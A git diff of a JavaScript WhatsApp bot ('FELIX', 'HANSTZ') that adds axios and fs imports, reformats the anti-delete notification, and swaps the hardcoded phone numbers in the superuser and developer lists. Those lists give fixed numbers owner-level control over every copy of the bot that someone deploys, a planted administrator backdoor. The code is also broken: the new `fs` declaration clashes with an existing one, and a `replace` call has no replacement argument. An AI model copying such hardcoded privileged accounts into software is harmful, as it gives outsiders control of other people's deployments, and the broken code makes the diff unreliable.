@@ -56,6 +56,8 @@ logger.level = 'silent';
 const pino = require("pino");
 const boom_1 = require("@hapi/boom");
 const conf = require("./set");
+const axios = require('axios');
+const fs = require('fs');
 let fs = require("fs-extra");
 let path = require("path");
 const FileType = require('file-type');
@@ -187,8 +189,9 @@ setTimeout(() => {
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
   let notification = `*FELIX ANTIDELETE*\n\n`;
-  notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
-  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by HANSTZ*\n\n`;
+  notification +=   `*TIME DELETED :* ${new Date().toLocaleString()}\n`;
+  notification +=   `*DELETED BY   :* @${deletedBy.split('@')[0]}\n\n
+                    *POWERED BY HANSTZ*\n\n`;
   return notification;
 }
 
@@ -664,10 +667,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254748387615", '254110190196', '254748387615', "254796299159", '254752925938', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "255760774888", '254110190196', '255760774888', "255756530143", '255760774888', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254110190196', '254748387615', "254796299159", '254752925938'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254110190196', '255760774888', "255756530143", '255760774888'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
